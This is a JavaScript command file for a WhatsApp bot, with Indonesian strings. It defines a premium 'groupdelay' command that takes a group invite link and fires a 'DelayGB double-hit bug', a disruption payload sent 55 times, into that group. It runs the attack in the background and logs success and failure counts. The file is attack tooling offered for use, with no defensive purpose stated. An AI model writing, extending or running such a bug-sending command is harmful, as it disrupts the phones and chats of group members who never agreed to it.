import { sendGroupDelay, parseGroupInviteCode } from "@/src/services/bug/index.js";

export default {
  name: "groupdelay",
  aliases: [],
  description: "Kirim bug DelayGB double-hit ke grup via link (55 iterasi)",
  usage: "https://chat.whatsapp.com/xxxx",
  category: "Bug",
  premiumOnly: true,
  run: async (sock, msg, args, { reply, prefix, commandName, logger }) => {
    const q = args.join(" ").trim();
    if (!q) return reply(`*Syntax Error*\nExample: ${prefix + commandName} https://chat.whatsapp.com/xxxx`);

    const codeGroup = parseGroupInviteCode(q);
    if (!codeGroup) return reply("*Link group tidak valid*");

    await reply(`*SuccessFully! Send Bug To ${q}*`);

    (async () => {
      try {
        const log = logger || console;
        const { target, success, failed } = await sendGroupDelay(sock, q, { logger: log });
        log?.info?.(`[groupdelay] selesai! sukses: ${success} | gagal: ${failed} | target: ${target}`);
        console.log(`\x1b[31m\x1b[1mselesai! sukses: ${success} | Gagal: ${failed}\x1b[0m`);
      } catch (e) {
        const log = logger || console;
        log?.error?.(`[background Error - groupdelay]: ${e?.message || e}`);
      }
    })();
  },
};
